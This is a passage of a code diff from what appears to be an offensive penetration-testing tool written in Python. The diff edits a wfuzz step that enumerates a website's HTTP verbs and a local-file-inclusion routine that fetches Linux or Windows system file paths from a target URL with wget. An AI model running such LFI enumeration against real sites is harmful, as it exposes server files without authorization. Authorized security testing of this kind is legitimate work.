@@ -1368,7 +1368,6 @@ while True:
       BAK = WEB
       WEB = input("[?] Please enter the web address: ")      
       if WEB != "":
-         WEB = spacePadding(WEB, COL1)
          if proxyChains != 1:
             print(colored("[*] Enumerating website url for verbs...", colour3))
             remotCOM("wfuzz -f verbs.tmp,raw -z list,PUT-DELETE-GET-HEAD-POST-TRACE-OPTIONS -X FUZZ " + WEB.rstrip(" ") + " > temp.tmp 2>&1")
@@ -3477,19 +3476,19 @@ while True:
       checkParams = test_WEB()
       if checkParams != 1:
          print(colored("[*] Using webpage LFI to enumerate files...", colour3))   
-         if OSF[:1] != "":
+         if OSF[:5].upper() != "EMPTY":
             os.chdir("BLACKBRIAR")
             if OSF[:5].upper() == "LINUX":
-               file1 = open("./TREADSTONE/linuxlfi.txt", 'r')
+               file1 = open("../TREADSTONE/linuxlfi.txt", 'r')
                Lines = file1.readlines()
                for line in Lines:
-                  localCom("curl --silent " + WEB.rstrip(" ") + "/"  + line)
+                  remotCOM("wget --quiet " + WEB.rstrip(" ") + line + " > " + line.rstrip("/")  + ".txt")
                print("[+] Completed...")
             else:
-               file1 = open("./TREADSTONE/windowslfi.txt", 'r')
+               file1 = open("../TREADSTONE/windowslfi.txt", 'r')
                Lines = file1.readlines()
                for line in Lines:
-                  localCom("curl --silent " + WEB.rstrip(" ") + "/"  + line)
+                  remotCOM("wget --quiet " + WEB.rstrip(" ") + line + " > " + line.rstrip("/")  + ".txt")
                print("[+] Completed...")
             localCOM("cd ..")
          else:
